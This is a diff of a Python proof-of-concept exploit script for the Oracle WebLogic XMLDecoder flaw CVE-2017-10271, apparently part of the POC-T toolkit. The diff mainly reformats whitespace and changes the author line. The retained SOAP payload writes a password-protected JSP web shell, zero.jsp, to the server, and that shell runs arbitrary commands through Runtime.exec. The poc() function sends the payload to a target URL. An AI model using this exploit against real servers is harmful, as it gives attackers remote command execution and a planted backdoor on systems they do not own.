@@ -1,20 +1,18 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 # project = https://github.com/Xyntax/POC-T
-# author = i@cdxy.me
+# author = starnight_cyber
 
 """
-'''
-	Script : weblogic-wls.py
+    Script : weblogic-wls.py
     Author : starnight_cyber
     Time : 2017.1.8
 
-	WebLogic Server WLS RCE (CVE-2017-10271):
-		OracleWebLogic Server10.3.6.0.0
-		OracleWebLogic Server12.1.3.0.0
-		OracleWebLogic Server12.2.1.1.0
-		OracleWebLogic Server12.2.1.2.0
-'''
+    WebLogic Server WLS RCE (CVE-2017-10271):
+        OracleWebLogic Server 10.3.6.0.0
+        OracleWebLogic Server 12.1.3.0.0
+        OracleWebLogic Server 12.2.1.1.0
+        OracleWebLogic Server 12.2.1.2.0
 
 """
 
@@ -27,10 +25,10 @@ headers = {
 }
 
 payload = '''
-<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Header><work:WorkContext
-xmlns:work="http://bea.com/2004/06/soap/workarea/"><java><java version="1.4.0" class="java.beans.XMLDecoder">
-<void class="java.io.PrintWriter"> <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/zero.jsp</string>
-<void method="println"><string><![CDATA[<%   if("v".equals(request.getParameter("pwd"))){
+    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Header><work:WorkContext
+    xmlns:work="http://bea.com/2004/06/soap/workarea/"><java><java version="1.4.0" class="java.beans.XMLDecoder">
+    <void class="java.io.PrintWriter"> <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/zero.jsp</string>
+    <void method="println"><string><![CDATA[<%   if("v".equals(request.getParameter("pwd"))){
         java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();
         int a = -1;
         byte[] b = new byte[2048];
@@ -42,6 +40,7 @@ xmlns:work="http://bea.com/2004/06/soap/workarea/"><java><java version="1.4.0" c
     } %>]]></string></void><void method="close"/>
     </void></java></java></work:WorkContext></soapenv:Header><soapenv:Body/></soapenv:Envelope>
 '''
+
 
 def poc(url):
     try:
@@ -59,5 +58,5 @@ def poc(url):
         return bool(resp.status_code == 200)
 
     except Exception:
-    	# anything wrong, return False
+        # anything wrong, return False
         return False
